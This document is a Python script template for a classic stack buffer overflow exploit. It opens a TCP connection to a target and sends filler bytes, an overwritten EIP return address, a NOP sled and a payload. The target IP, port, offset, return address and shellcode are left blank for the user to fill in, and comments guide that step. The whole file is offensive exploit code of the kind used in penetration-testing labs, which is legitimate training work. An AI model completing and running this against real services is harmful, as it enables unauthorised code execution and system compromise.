#!/usr/bin/env python3

import socket, time, sys
from time import sleep

ip = ""

port =              # Integer
timeout = 5               # Integer
return_value = "\r\n"     # Does the server take input that requires enter for input? Send empty if not required
offset = 
padding = "\x90" * 20

# Remember little Endian e.g 0x625011af becomes \xaf\x11\x50\x62
EIP = 

prefix = ""
string = "A" * offset

payload =  b""

try:
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((ip, port))
      s.settimeout(timeout) # Helpful for stopping when overflow occurs
      print("Fuzzing with {} bytes".format(len(string)) + "and EIP as %s" % EIP)

      # Send buffer + EIP + payload + "press enter"
      s.send(bytes(prefix, "latin1") + bytes(string, "latin1") + bytes(EIP, "latin1") +  bytes(padding, "latin1") + payload + bytes(return_value, "latin1")) 
      s.recv(1024) 
      s.close()
except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
